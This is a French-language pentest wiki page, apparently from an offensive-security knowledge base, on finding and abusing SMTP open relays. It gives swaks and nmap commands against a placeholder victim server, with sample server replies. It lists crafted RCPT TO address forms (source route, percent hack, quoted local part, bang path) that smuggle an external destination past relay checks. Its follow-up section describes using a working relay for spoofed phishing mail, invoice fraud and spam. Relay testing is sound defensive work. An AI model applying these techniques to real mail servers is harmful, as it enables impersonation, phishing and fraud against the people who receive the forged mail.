---
title: "Open relay : envoyer du courrier au nom de n'importe qui via un MTA mal configuré"
description: "Un open relay accepte le courrier d'un expéditeur externe adressé à un destinataire externe et le transfère, permettant à un attaquant d'envoyer du courrier usurpé au nom de n'importe quelle adresse via le serveur de la victime. Des astuces de relais partiel (routage par la source, percent-hack, mise entre guillemets, chemins bang) déjouent les serveurs qui ne bloquent que le cas naïf."
keywords:
  - open relay
  - smtp relay
  - swaks
  - mail spoofing
  - relay access denied
---

# Open relay

Un serveur de messagerie ne devrait relayer le courrier que pour ses propres domaines ou ses clients authentifiés. Un open relay échoue à cette vérification : il accepte un `MAIL FROM` depuis une adresse qu'il ne possède pas et un `RCPT TO` pour un destinataire qu'il ne sert pas, puis le délivre. Cela transforme le serveur en un moteur d'usurpation gratuit porteur de réputation : vous vous connectez, prétendez être n'importe qui, adressez à n'importe qui, et le serveur l'envoie. Le test consiste simplement à savoir si l'expéditeur externe et le destinataire externe sont tous deux acceptés et si le message est mis en file. Les serveurs qui bloquent le cas évident externe-vers-externe relaient souvent encore lorsque la destination est dissimulée dans une forme d'adresse héritée, de sorte qu'un relais « fermé » doit être retesté avec ces formes avant d'y croire.

## Prérequis

- Port 25 joignable (le test de relais concerne le MTA à MTA ; la soumission sur 587 exige AUTH et n'est pas un « open relay » en ce sens).
- Une boîte aux lettres que vous contrôlez hors des domaines de la victime pour recevoir le message de preuve (toute adresse externe, par exemple un Gmail jetable).
- Aucun identifiant nécessaire : un open relay est ouvert précisément parce qu'il n'en demande pas.

## Test guidé

```bash
# swaks makes the whole transaction and prints every line of the dialogue
swaks --server mail.victim.com --to proof@gmail.com --from ceo@othercorp.com
```
Lisez la réponse du serveur à `RCPT TO` et le résultat final de `DATA` :

```text
<~  250 2.1.0 <ceo@othercorp.com>: Sender address accepted
 ~> RCPT TO:<proof@gmail.com>
<~  250 2.1.5 <proof@gmail.com>: Recipient address accepted   # external->external accepted
...
<~  250 2.0.0 Ok: queued as 4F2a...                           # RELAY IS OPEN
```
contre un relais fermé :
```text
<~  554 5.7.1 <proof@gmail.com>: Relay access denied          # refuses to relay
```

`250 ... queued` sur un message externe-vers-externe signifie que le courrier a quitté le serveur avec votre expéditeur falsifié. `554 Relay access denied` (ou `550`) signifie que le chemin naïf est fermé, passez donc aux formes de relais partiel.

## Formes de relais partiel

La réécriture d'adresse héritée fait apparaître une destination comme locale pour la vérification de relais tout en la routant en externe. Testez chacune lorsque la forme directe est refusée :

```text
RCPT TO:<proof@gmail.com@mail.victim.com>     # source route: delivered on to gmail.com
RCPT TO:<proof%gmail.com@mail.victim.com>     # percent hack: % rewritten to @ on relay
RCPT TO:<"proof@gmail.com"@mail.victim.com>   # quoted local part smuggles the real target
RCPT TO:<@mail.victim.com:proof@gmail.com>    # RFC source-route syntax
RCPT TO:<mail.victim.com!proof@gmail.com>     # UUCP bang path
```
Un `250` sur l'une de ces formes est un relais fonctionnel via cette réécriture. Nmap les pilote toutes pour vous :

```bash
nmap -p25 --script smtp-open-relay -v mail.victim.com
# smtp-open-relay: Server is an open relay (3/16 tests)   <- which of 16 variants passed
```
Lisez la fraction : `0/16` est fermé, tout compte non nul nomme une forme utilisable (la sortie détaillée liste quelles chaînes de test ont été acceptées).

## Suites

- Envoyez du courrier usurpé au nom de tout expéditeur en qui la cible a confiance : un `From:` d'apparence interne pour le hameçonnage, des adresses de fournisseurs pour la fraude à la facture. La délivrance affronte toujours le SPF/DKIM/DMARC du destinataire, de sorte que le relais est le plus puissant lorsqu'il relaie *pour* un domaine qu'il est autorisé à envoyer.
- La distribution de masse (spam) profite de la réputation de l'adresse IP du serveur.
- Associez à l'[énumération des utilisateurs](user-enumeration.md) pour adresser de vrais destinataires internes, et comparez au [SMTP smuggling](smtp-smuggling.md) lorsque vous avez besoin que l'usurpation passe DMARC plutôt que de simplement atteindre la boîte de réception.

## Outils

- [swaks](https://github.com/jetmore/swaks)
- [Nmap smtp-open-relay](https://nmap.org/nsedoc/scripts/smtp-open-relay.html)

## Références

- [RFC 5321 section 3.6.1 (routes par la source)](https://datatracker.ietf.org/doc/html/rfc5321#section-3.6.1)
- [Documentation de swaks](https://www.jetmore.org/john/code/swaks/latest/doc/ref.txt)
- [HackTricks : open relay](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html)
